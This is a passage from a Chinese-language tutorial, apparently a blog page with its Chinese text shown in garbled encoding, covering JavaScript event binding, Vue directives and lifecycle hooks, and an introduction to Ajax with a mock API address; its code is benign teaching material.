<h3 id="7-äº‹ä»¶ç»‘å®š"><a href="#7-äº‹ä»¶ç»‘å®š" class="headerlink" title="7).äº‹ä»¶ç»‘å®š"></a>7).äº‹ä»¶ç»‘å®š</h3><h4 id="æ–¹å¼1ï¼šé€šè¿‡htmlæ ‡ç­¾ä¸­çš„äº‹ä»¶å±æ€§è¿›è¡Œç»‘å®š"><a href="#æ–¹å¼1ï¼šé€šè¿‡htmlæ ‡ç­¾ä¸­çš„äº‹ä»¶å±æ€§è¿›è¡Œç»‘å®š" class="headerlink" title="æ–¹å¼1ï¼šé€šè¿‡htmlæ ‡ç­¾ä¸­çš„äº‹ä»¶å±æ€§è¿›è¡Œç»‘å®š"></a>æ–¹å¼1ï¼šé€šè¿‡htmlæ ‡ç­¾ä¸­çš„äº‹ä»¶å±æ€§è¿›è¡Œç»‘å®š</h4><p>ä¾‹å¦‚ä¸€ä¸ªæŒ‰é’®ï¼Œæˆ‘ä»¬å¯¹äºæŒ‰é’®å¯ä»¥ç»‘å®šå•æœºäº‹ä»¶ï¼Œå¯ä»¥å€ŸåŠ©æ ‡ç­¾çš„onclickå±æ€§ï¼Œå±æ€§å€¼æŒ‡å‘ä¸€ä¸ªå‡½æ•°ã€‚</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;äº‹ä»¶ç»‘å®š1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;on()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¾ˆæ˜æ˜¾æ²¡æœ‰onå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ›å»ºè¯¥å‡½æ•°ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">on</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&quot;æŒ‰é’®1è¢«ç‚¹å‡»äº†...&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="æ–¹å¼2ï¼šé€šè¿‡DOMä¸­Elementå…ƒç´ çš„äº‹ä»¶å±æ€§è¿›è¡Œç»‘å®š"><a href="#æ–¹å¼2ï¼šé€šè¿‡DOMä¸­Elementå…ƒç´ çš„äº‹ä»¶å±æ€§è¿›è¡Œç»‘å®š" class="headerlink" title="æ–¹å¼2ï¼šé€šè¿‡DOMä¸­Elementå…ƒç´ çš„äº‹ä»¶å±æ€§è¿›è¡Œç»‘å®š"></a>æ–¹å¼2ï¼šé€šè¿‡DOMä¸­Elementå…ƒç´ çš„äº‹ä»¶å±æ€§è¿›è¡Œç»‘å®š</h4><p>ä¾æ®æˆ‘ä»¬å­¦ä¹ è¿‡å¾—DOMçš„çŸ¥è¯†ç‚¹ï¼Œæˆ‘ä»¬çŸ¥é“htmlä¸­çš„æ ‡ç­¾è¢«åŠ è½½æˆelementå¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡elementå¯¹è±¡çš„å±æ€§æ¥æ“ä½œæ ‡ç­¾çš„å±æ€§ã€‚æ­¤æ—¶æˆ‘ä»¬å†æ¬¡æ·»åŠ ä¸€ä¸ªæŒ‰é’®ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;äº‹ä»¶ç»‘å®š2&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥å…ˆé€šè¿‡idå±æ€§è·å–æŒ‰é’®å¯¹è±¡ï¼Œç„¶åæ“ä½œå¯¹è±¡çš„onclickå±æ€§æ¥ç»‘å®šäº‹ä»¶ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btn2&#x27;</span>).<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;æŒ‰é’®2è¢«ç‚¹å‡»äº†...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="8-ä¸€äº›å¸¸è§çš„äº‹ä»¶"><a href="#8-ä¸€äº›å¸¸è§çš„äº‹ä»¶" class="headerlink" title="8).ä¸€äº›å¸¸è§çš„äº‹ä»¶"></a>8).ä¸€äº›å¸¸è§çš„äº‹ä»¶</h3><table>
<thead>
<tr>
<th>äº‹ä»¶å±æ€§å</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>onclick</td>
<td>é¼ æ ‡å•å‡»äº‹ä»¶</td>
</tr>
<tr>
<td>onblur</td>
<td>å…ƒç´ å¤±å»ç„¦ç‚¹</td>
</tr>
<tr>
<td>onfocus</td>
<td>å…ƒç´ è·å¾—ç„¦ç‚¹</td>
</tr>
<tr>
<td>onload</td>
<td>æŸä¸ªé¡µé¢æˆ–å›¾åƒè¢«å®ŒæˆåŠ è½½</td>
</tr>
<tr>
<td>onsubmit</td>
<td>å½“è¡¨å•æäº¤æ—¶è§¦å‘è¯¥äº‹ä»¶</td>
</tr>
<tr>
<td>onmouseover</td>
<td>é¼ æ ‡è¢«ç§»åˆ°æŸå…ƒç´ ä¹‹ä¸Š</td>
</tr>
<tr>
<td>onmouseout</td>
<td>é¼ æ ‡ä»æŸå…ƒç´ ç§»å¼€</td>
</tr>
</tbody></table>
<h2 id="4ã€vueçš„åŸºæœ¬ä½¿ç”¨"><a href="#4ã€vueçš„åŸºæœ¬ä½¿ç”¨" class="headerlink" title="4ã€vueçš„åŸºæœ¬ä½¿ç”¨"></a>4ã€vueçš„åŸºæœ¬ä½¿ç”¨</h2><h3 id="1ã€å¿«é€Ÿå…¥é—¨"><a href="#1ã€å¿«é€Ÿå…¥é—¨" class="headerlink" title="1ã€å¿«é€Ÿå…¥é—¨"></a>1ã€å¿«é€Ÿå…¥é—¨</h3><p>ç¬¬ä¸€æ­¥ï¼šå°†vue.jsä¸‹è½½æ‹·è´åˆ°é¡¹ç›®ç›®å½•ä¸‹</p>
<p>ç¬¬äºŒæ­¥ï¼šç„¶åç¼–å†™&lt;script&gt;æ ‡ç­¾æ¥å¼•å…¥vue.jsæ–‡ä»¶ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸‰æ­¥ï¼šåœ¨jsä»£ç åŒºåŸŸå®šä¹‰vueå¯¹è±¡,ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//å®šä¹‰Vueå¯¹è±¡</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>, <span class="comment">//vueæ¥ç®¡åŒºåŸŸ</span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>: <span class="string">&quot;Hello Vue&quot;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨åˆ›å»ºvueå¯¹è±¡æ—¶ï¼Œæœ‰å‡ ä¸ªå¸¸ç”¨çš„å±æ€§ï¼š</p>
<ul>
<li>el:  ç”¨æ¥æŒ‡å®šå“ªå„¿äº›æ ‡ç­¾å— Vue ç®¡ç†ã€‚ è¯¥å±æ€§å–å€¼ <code>#app</code> ä¸­çš„ <code>app</code> éœ€è¦æ˜¯å—ç®¡ç†çš„æ ‡ç­¾çš„idå±æ€§å€¼</li>
<li>data: ç”¨æ¥å®šä¹‰æ•°æ®æ¨¡å‹</li>
<li>methods: ç”¨æ¥å®šä¹‰å‡½æ•°ã€‚è¿™ä¸ªæˆ‘ä»¬åœ¨åé¢å°±ä¼šç”¨åˆ°</li>
</ul>
<p>ç¬¬å››æ­¥ï¼šåœ¨htmlåŒºåŸŸç¼–å†™è§†å›¾ï¼Œå…¶ä¸­åŒå¤§æ‹¬å·æ˜¯æ’å€¼è¡¨è¾¾å¼ï¼Œç”¨æ¥å°†vueå¯¹è±¡ä¸­å®šä¹‰çš„modelå±•ç¤ºåˆ°é¡µé¢ä¸Šçš„</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;message&quot;</span>&gt;</span></span><br><span class="line">        &#123;&#123;message&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æµè§ˆå™¨æ‰“å¼€æ•ˆæœå¦‚å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/9485d513933405e6a210b4d9c55c3643--bbba--image-20231121195000984.png" alt="image-20231121195000984"></p>
<h3 id="2ã€vueæŒ‡ä»¤"><a href="#2ã€vueæŒ‡ä»¤" class="headerlink" title="2ã€vueæŒ‡ä»¤"></a>2ã€vueæŒ‡ä»¤</h3><table>
<thead>
<tr>
<th><strong>æŒ‡ä»¤</strong></th>
<th><strong>ä½œç”¨</strong></th>
</tr>
</thead>
<tbody><tr>
<td><u><strong>v-bind</strong></u></td>
<td><u><strong>ä¸ºHTMLæ ‡ç­¾ç»‘å®šå±æ€§å€¼ï¼Œå¦‚è®¾ç½®  href , cssæ ·å¼ç­‰</strong></u></td>
</tr>
<tr>
<td><u><strong>v-model</strong></u></td>
<td><u><strong>åœ¨è¡¨å•å…ƒç´ ä¸Šåˆ›å»ºåŒå‘æ•°æ®ç»‘å®š</strong></u></td>
</tr>
<tr>
<td>v-on</td>
<td>ä¸ºHTMLæ ‡ç­¾ç»‘å®šäº‹ä»¶</td>
</tr>
<tr>
<td>v-if</td>
<td>æ¡ä»¶æ€§çš„æ¸²æŸ“æŸå…ƒç´ ï¼Œåˆ¤å®šä¸ºtrueæ—¶æ¸²æŸ“,å¦åˆ™ä¸æ¸²æŸ“</td>
</tr>
<tr>
<td>v-else</td>
<td></td>
</tr>
<tr>
<td>v-else-if</td>
<td></td>
</tr>
<tr>
<td>v-show</td>
<td>æ ¹æ®æ¡ä»¶å±•ç¤ºæŸå…ƒç´ ï¼ŒåŒºåˆ«åœ¨äºåˆ‡æ¢çš„æ˜¯displayå±æ€§çš„å€¼</td>
</tr>
<tr>
<td>v-for</td>
<td>åˆ—è¡¨æ¸²æŸ“ï¼Œéå†å®¹å™¨çš„å…ƒç´ æˆ–è€…å¯¹è±¡çš„å±æ€§</td>
</tr>
</tbody></table>
<h4 id="â‘ v-bind"><a href="#â‘ v-bind" class="headerlink" title="â‘ v-bind:"></a>â‘ v-bind:</h4><p>ä¸ºHTMLæ ‡ç­¾ç»‘å®šå±æ€§å€¼ï¼Œå¦‚è®¾ç½®  href , cssæ ·å¼ç­‰ã€‚å½“vueå¯¹è±¡ä¸­çš„æ•°æ®æ¨¡å‹å‘ç”Ÿå˜åŒ–æ—¶ï¼Œæ ‡ç­¾çš„å±æ€§å€¼ä¼šéšä¹‹å‘ç”Ÿå˜åŒ–ã€‚</p>
<h4 id="â‘¡v-modelï¼š"><a href="#â‘¡v-modelï¼š" class="headerlink" title="â‘¡v-modelï¼š"></a>â‘¡v-modelï¼š</h4><p>åœ¨è¡¨å•å…ƒç´ ä¸Šåˆ›å»ºåŒå‘æ•°æ®ç»‘å®šã€‚ä»€ä¹ˆæ˜¯åŒå‘ï¼Ÿ</p>
<ul>
<li>vueå¯¹è±¡çš„dataå±æ€§ä¸­çš„æ•°æ®å˜åŒ–ï¼Œè§†å›¾å±•ç¤ºä¼šä¸€èµ·å˜åŒ–</li>
<li>è§†å›¾æ•°æ®å‘ç”Ÿå˜åŒ–ï¼Œvueå¯¹è±¡çš„dataå±æ€§ä¸­çš„æ•°æ®ä¹Ÿä¼šéšç€å˜åŒ–ã€‚</li>
</ul>
<p>dataå±æ€§ä¸­æ•°æ®å˜åŒ–ï¼Œæˆ‘ä»¬çŸ¥é“å¯ä»¥é€šè¿‡èµ‹å€¼æ¥æ”¹å˜ï¼Œä½†æ˜¯è§†å›¾æ•°æ®ä¸ºä»€ä¹ˆä¼šå‘ç”Ÿå˜åŒ–å‘¢ï¼Ÿ<strong>åªæœ‰è¡¨å•é¡¹æ ‡ç­¾ï¼æ‰€ä»¥åŒå‘ç»‘å®šä¸€å®šæ˜¯ä½¿ç”¨åœ¨è¡¨å•é¡¹æ ‡ç­¾ä¸Šçš„</strong>ã€‚</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å­¦ä¹ ä¸€ä¸‹v-onæŒ‡ä»¤ã€‚</p>
<h4 id="â‘¢v-on"><a href="#â‘¢v-on" class="headerlink" title="â‘¢v-on:"></a>â‘¢v-on:</h4><p>ç”¨æ¥ç»™htmlæ ‡ç­¾ç»‘å®šäº‹ä»¶çš„ã€‚<strong>éœ€è¦æ³¨æ„çš„æ˜¯å¦‚ä¸‹2ç‚¹</strong>ï¼š</p>
<ul>
<li><p>v-onè¯­æ³•ç»™æ ‡ç­¾çš„äº‹ä»¶ç»‘å®šçš„å‡½æ•°ï¼Œå¿…é¡»æ˜¯vueå¯¹è±¡ç§å£°æ˜çš„å‡½æ•°</p>
</li>
<li><p>v-onè¯­æ³•ç»‘å®šäº‹ä»¶æ—¶ï¼Œäº‹ä»¶åç›¸æ¯”è¾ƒjsä¸­çš„äº‹ä»¶åï¼Œæ²¡æœ‰on</p>
<p>ä¾‹å¦‚ï¼šåœ¨jsä¸­ï¼Œäº‹ä»¶ç»‘å®šdemoå‡½æ•°</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onclick</span>=<span class="string">&quot;demo()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>vueä¸­ï¼Œäº‹ä»¶ç»‘å®šdemoå‡½æ•°</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-on:click</span>=<span class="string">&quot;demo()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="â‘£v-ifå’Œv-show"><a href="#â‘£v-ifå’Œv-show" class="headerlink" title="â‘£v-ifå’Œv-show"></a>â‘£v-ifå’Œv-show</h4><p>ç”¨äºè§‰å¾—æ˜¯å¦å±•ç¤º</p>
<p>å¯ä»¥å‘ç°ï¼Œæµè§ˆå™¨å‘ˆç°çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯æµè§ˆå™¨ä¸­htmlæºç ä¸ä¸€æ ·ã€‚v-ifæŒ‡ä»¤ï¼Œä¸æ»¡è¶³æ¡ä»¶çš„æ ‡ç­¾ä»£ç ç›´æ¥æ²¡äº†ï¼Œè€Œv-showæŒ‡ä»¤ä¸­ï¼Œä¸æ»¡è¶³æ¡ä»¶çš„ä»£ç ä¾ç„¶å­˜åœ¨ï¼Œåªæ˜¯æ·»åŠ äº†cssæ ·å¼æ¥æ§åˆ¶æ ‡ç­¾ä¸å»æ˜¾ç¤ºã€‚</p>
<h4 id="â‘¤v-for"><a href="#â‘¤v-for" class="headerlink" title="â‘¤v-for"></a>â‘¤v-for</h4><p>v-for: ä»åå­—æˆ‘ä»¬å°±èƒ½çœ‹å‡ºï¼Œè¿™ä¸ªæŒ‡ä»¤æ˜¯ç”¨æ¥éå†çš„ã€‚å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">æ ‡ç­¾</span> <span class="attr">v-for</span>=<span class="string">&quot;å˜é‡å in é›†åˆæ¨¡å‹æ•°æ®&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123;å˜é‡å&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">æ ‡ç­¾</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼šéœ€è¦å¾ªç¯é‚£ä¸ªæ ‡ç­¾ï¼Œv-for æŒ‡ä»¤å°±å†™åœ¨é‚£ä¸ªæ ‡ç­¾ä¸Šã€‚</p>
<p>æœ‰æ—¶æˆ‘ä»¬éå†æ—¶éœ€è¦ä½¿ç”¨ç´¢å¼•ï¼Œé‚£ä¹ˆv-foræŒ‡ä»¤éå†çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">æ ‡ç­¾</span> <span class="attr">v-for</span>=<span class="string">&quot;(å˜é‡å,ç´¢å¼•å˜é‡) in é›†åˆæ¨¡å‹æ•°æ®&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--ç´¢å¼•å˜é‡æ˜¯ä»0å¼€å§‹ï¼Œæ‰€ä»¥è¦è¡¨ç¤ºåºå·çš„è¯ï¼Œéœ€è¦æ‰‹åŠ¨çš„åŠ 1--&gt;</span></span><br><span class="line">   &#123;&#123;ç´¢å¼•å˜é‡ + 1&#125;&#125; &#123;&#123;å˜é‡å&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">æ ‡ç­¾</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3ã€ç”Ÿå‘½å‘¨æœŸ"><a href="#3ã€ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="3ã€ç”Ÿå‘½å‘¨æœŸ"></a>3ã€ç”Ÿå‘½å‘¨æœŸ</h3><p>vueçš„ç”Ÿå‘½å‘¨æœŸï¼šæŒ‡çš„æ˜¯vueå¯¹è±¡ä»åˆ›å»ºåˆ°é”€æ¯çš„è¿‡ç¨‹ã€‚vueçš„ç”Ÿå‘½å‘¨æœŸåŒ…å«8ä¸ªé˜¶æ®µï¼šæ¯è§¦å‘ä¸€ä¸ªç”Ÿå‘½å‘¨æœŸäº‹ä»¶ï¼Œä¼šè‡ªåŠ¨æ‰§è¡Œä¸€ä¸ªç”Ÿå‘½å‘¨æœŸæ–¹æ³•ï¼Œè¿™äº›ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ä¹Ÿè¢«ç§°ä¸ºé’©å­æ–¹æ³•ã€‚å…¶å®Œæ•´çš„ç”Ÿå‘½å‘¨æœŸå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<table>
<thead>
<tr>
<th>çŠ¶æ€</th>
<th>é˜¶æ®µå‘¨æœŸ</th>
</tr>
</thead>
<tbody><tr>
<td>beforeCreate</td>
<td>åˆ›å»ºå‰</td>
</tr>
<tr>
<td>created</td>
<td>åˆ›å»ºå</td>
</tr>
<tr>
<td>beforeMount</td>
<td>æŒ‚è½½å‰</td>
</tr>
<tr>
<td>mounted</td>
<td>æŒ‚è½½å®Œæˆ</td>
</tr>
<tr>
<td>beforeUpdate</td>
<td>æ›´æ–°å‰</td>
</tr>
<tr>
<td>updated</td>
<td>æ›´æ–°å</td>
</tr>
<tr>
<td>beforeDestroy</td>
<td>é”€æ¯å‰</td>
</tr>
<tr>
<td>destroyed</td>
<td>é”€æ¯å</td>
</tr>
</tbody></table>
<p>ä¸‹å›¾æ˜¯ Vue å®˜ç½‘æä¾›çš„ä»åˆ›å»º Vue åˆ°æ•ˆæœ Vue å¯¹è±¡çš„æ•´ä¸ªè¿‡ç¨‹åŠå„ä¸ªé˜¶æ®µå¯¹åº”çš„é’©å­å‡½æ•°ï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/d3dd27cb2a5d10c6de0c00f4c9cf12fd--9b10--image-20231121195747907.png" alt="image-20231121195747907"></p>
<p>å…¶ä¸­æˆ‘ä»¬éœ€è¦é‡ç‚¹å…³æ³¨çš„æ˜¯**mounted,**å…¶ä»–çš„æˆ‘ä»¬äº†è§£å³å¯ã€‚</p>
<p>mountedï¼šæŒ‚è½½å®Œæˆï¼ŒVueåˆå§‹åŒ–æˆåŠŸï¼ŒHTMLé¡µé¢æ¸²æŸ“æˆåŠŸã€‚<strong>ä»¥åæˆ‘ä»¬ä¸€èˆ¬ç”¨äºé¡µé¢åˆå§‹åŒ–è‡ªåŠ¨çš„ajaxè¯·æ±‚åå°æ•°æ®</strong></p>
<h2 id="5ã€Ajaxçš„ä½¿ç”¨"><a href="#5ã€Ajaxçš„ä½¿ç”¨" class="headerlink" title="5ã€Ajaxçš„ä½¿ç”¨"></a>5ã€Ajaxçš„ä½¿ç”¨</h2><h3 id="1ã€Ajaxçš„ä»‹ç»"><a href="#1ã€Ajaxçš„ä»‹ç»" class="headerlink" title="1ã€Ajaxçš„ä»‹ç»"></a>1ã€Ajaxçš„ä»‹ç»</h3><p>æˆ‘ä»¬è¯¦ç»†çš„è§£é‡Šä¸€ä¸‹AjaxæŠ€æœ¯çš„2ä¸ªä½œç”¨</p>
<ul>
<li><p>ä¸æœåŠ¡å™¨è¿›è¡Œæ•°æ®äº¤äº’</p>
<p>å¦‚ä¸‹å›¾æ‰€ç¤ºå‰ç«¯èµ„æºè¢«æµè§ˆå™¨è§£æï¼Œä½†æ˜¯å‰ç«¯é¡µé¢ä¸Šç¼ºå°‘æ•°æ®ï¼Œå‰ç«¯å¯ä»¥é€šè¿‡AjaxæŠ€æœ¯ï¼Œå‘åå°æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼Œåå°æœåŠ¡å™¨æ¥å—åˆ°å‰ç«¯çš„è¯·æ±‚ï¼Œä»æ•°æ®åº“ä¸­è·å–å‰ç«¯éœ€è¦çš„èµ„æºï¼Œç„¶åå“åº”ç»™å‰ç«¯ï¼Œå‰ç«¯åœ¨é€šè¿‡æˆ‘ä»¬å­¦ä¹ çš„vueæŠ€æœ¯ï¼Œå¯ä»¥å°†æ•°æ®å±•ç¤ºåˆ°é¡µé¢ä¸Šï¼Œè¿™æ ·ç”¨æˆ·å°±èƒ½çœ‹åˆ°å®Œæ•´çš„é¡µé¢äº†ã€‚æ­¤å¤„å¯ä»¥å¯¹æ¯”JavaSEä¸­çš„ç½‘ç»œç¼–ç¨‹æŠ€æœ¯æ¥ç†è§£ã€‚</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/1478bd2c5b10db3902848da91ea311f7--5dc6--image-20231125221238816.png" alt="image-20231125221238816"></p>
<p>å¼‚æ­¥äº¤äº’ï¼šå¯ä»¥åœ¨<strong>ä¸é‡æ–°åŠ è½½æ•´ä¸ªé¡µé¢</strong>çš„æƒ…å†µä¸‹ï¼Œä¸æœåŠ¡å™¨äº¤æ¢æ•°æ®å¹¶<strong>æ›´æ–°éƒ¨åˆ†ç½‘é¡µ</strong>çš„æŠ€æœ¯ã€‚</p>
<p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå½“æˆ‘ä»¬å†ç™¾åº¦æœç´¢javaæ—¶ï¼Œä¸‹é¢çš„è”æƒ³æ•°æ®æ˜¯é€šè¿‡Ajaxè¯·æ±‚ä»åå°æœåŠ¡å™¨å¾—åˆ°çš„ï¼Œåœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬çš„Ajaxè¯·æ±‚ä¸ä¼šå¯¼è‡´æ•´ä¸ªç™¾åº¦é¡µé¢çš„é‡æ–°åŠ è½½ï¼Œå¹¶ä¸”åªé’ˆå¯¹æœç´¢æ è¿™å±€éƒ¨æ¨¡å—çš„æ•°æ®è¿›è¡Œäº†æ•°æ®çš„æ›´æ–°ï¼Œä¸ä¼šå¯¹æ•´ä¸ªé¡µé¢çš„å…¶ä»–åœ°æ–¹è¿›è¡Œæ•°æ®çš„æ›´æ–°ï¼Œè¿™æ ·å°±å¤§å¤§æå‡äº†é¡µé¢çš„åŠ è½½é€Ÿåº¦ï¼Œç”¨æˆ·ä½“éªŒé«˜ã€‚</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/9c8182429cd46012b107552c0eaa8f90--794e--image-20231125221257133.png" alt="image-20231125221257133"></p>
<p>è¿™é‡Œä¹Ÿå°±å†æ¥è®²ä¸‹å¼‚æ­¥æ“ä½œå’ŒåŒæ­¥æ“ä½œçš„åŒºåˆ«æ˜¯ä»€ä¹ˆã€‚</p>
<p>åŒæ­¥è¯·æ±‚å‘é€è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/3eee530c76cba726b219ea41081ef642--233d--image-20231125221354077.png" alt="image-20231125221354077"></p>
<ul>
<li><p>æµè§ˆå™¨é¡µé¢åœ¨å‘é€è¯·æ±‚ç»™æœåŠ¡å™¨ï¼Œåœ¨æœåŠ¡å™¨å¤„ç†è¯·æ±‚çš„è¿‡ç¨‹ä¸­ï¼Œæµè§ˆå™¨é¡µé¢ä¸èƒ½åšå…¶ä»–çš„æ“ä½œã€‚åªèƒ½ç­‰åˆ°æœåŠ¡å™¨å“åº”ç»“æŸåæ‰èƒ½ï¼Œæµè§ˆå™¨é¡µé¢æ‰èƒ½ç»§ç»­åšå…¶ä»–çš„æ“ä½œã€‚ </p>
</li>
<li><p>å¼‚æ­¥è¯·æ±‚å‘é€è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/c577c087270747d00d18b684c2ebcca0--5447--image-20231125221404817.png" alt="image-20231125221404817"></p>
<ul>
<li>æµè§ˆå™¨é¡µé¢å‘é€è¯·æ±‚ç»™æœåŠ¡å™¨ï¼Œåœ¨æœåŠ¡å™¨å¤„ç†è¯·æ±‚çš„è¿‡ç¨‹ä¸­ï¼Œæµè§ˆå™¨é¡µé¢è¿˜å¯ä»¥åšå…¶ä»–çš„æ“ä½œã€‚</li>
</ul>
<p>è¿™æ ·å°±èƒ½åƒç™¾åº¦æœç´¢é‚£æ ·ï¼Œæœªç‚¹å‡»æœç´¢ä½†æ˜¯ä»ç„¶å¯ä»¥æ˜¾ç¤ºéƒ¨åˆ†æ•°æ®ã€‚</p>
<h3 id="2ã€Ajaxçš„ç®€å•ä½¿ç”¨"><a href="#2ã€Ajaxçš„ç®€å•ä½¿ç”¨" class="headerlink" title="2ã€Ajaxçš„ç®€å•ä½¿ç”¨"></a>2ã€Ajaxçš„ç®€å•ä½¿ç”¨</h3><ul>
<li><p>æœåŠ¡å™¨ç«¯</p>
<p>å› ä¸ºæˆ‘ä»¬æš‚æ—¶è¿˜æ²¡å­¦è¿‡æœåŠ¡å™¨ç«¯çš„ä»£ç ï¼Œæ‰€ä»¥æ­¤å¤„å·²ç»ç›´æ¥æä¾›å¥½äº†æœåŠ¡å™¨ç«¯çš„è¯·æ±‚åœ°å€ï¼Œæˆ‘ä»¬å‰ç«¯ç›´æ¥é€šè¿‡Ajaxè¯·æ±‚è®¿é—®è¯¥åœ°å€å³å¯ã€‚<strong>åå°æœåŠ¡å™¨åœ°å€</strong>ï¼š<a href="http://yapi.smart-xwork.cn/mock/169327/emp/list">http://yapi.smart-xwork.cn/mock/169327/emp/list</a></p>
<p>ä¸Šè¿°åœ°å€æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡æµè§ˆå™¨æ¥è®¿é—®ï¼Œè®¿é—®ç»“æœå¦‚å›¾æ‰€ç¤ºï¼šåªæˆªå–éƒ¨åˆ†æ•°æ®</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/e3c78a9e3285d3b9c77530b3800ca1d1--4d72--image-20231125222034015.png" alt="image-20231125222034015"></p>
</li>
<li><p>å®¢æˆ·ç«¯</p>
